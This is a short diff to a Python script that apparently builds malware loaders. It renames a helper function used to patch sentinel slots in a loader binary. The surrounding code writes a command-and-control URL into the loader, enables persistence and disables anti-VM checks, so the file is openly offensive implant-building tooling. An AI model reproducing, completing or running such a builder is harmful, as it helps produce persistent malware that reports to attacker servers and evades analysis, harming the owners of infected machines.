@@ -51,7 +51,7 @@ Press Ctrl+C to stop early.
 """
 import json, os, re, shutil, socket, subprocess, sys, time, struct, urllib.error, urllib.request, urllib.parse
 from c2auth import parse_c2_url, port_from_url
-from peutil import find_sentinel
+from peutil import patch_ready
 
 HERE   = os.path.dirname(os.path.abspath(__file__))
 BIN    = os.path.join(HERE, "bin")
@@ -507,17 +507,17 @@ def _patch_loader(loader_bytes, c2_url, persist=False, no_anti_vm=False):
         old_len = struct.unpack_from("<I", loader_bytes, idx - 4)[0]
         loader_bytes = loader_bytes[:idx - 4 - old_len]
     if c2_url:
-        sidx = find_sentinel(loader_bytes, C2_SENTINEL, 256)
+        sidx = patch_ready(loader_bytes, C2_SENTINEL, 256)
         if sidx != -1:
             url_bytes = c2_url.encode("utf-8")[:255]
             url_padded = url_bytes + b"\0" * (256 - len(url_bytes))
             loader_bytes = loader_bytes[:sidx] + url_padded + loader_bytes[sidx+256:]
     if persist:
-        pidx = find_sentinel(loader_bytes, PERSIST_SENTINEL, 8)
+        pidx = patch_ready(loader_bytes, PERSIST_SENTINEL, 8)
         if pidx != -1:
             loader_bytes = loader_bytes[:pidx] + PERSIST_ENABLE + loader_bytes[pidx+8:]
     if no_anti_vm:
-        aidx = find_sentinel(loader_bytes, AV_SENTINEL, 8)
+        aidx = patch_ready(loader_bytes, AV_SENTINEL, 8)
         if aidx != -1:
             loader_bytes = loader_bytes[:aidx] + AV_DISABLE + loader_bytes[aidx+8:]
     return loader_bytes
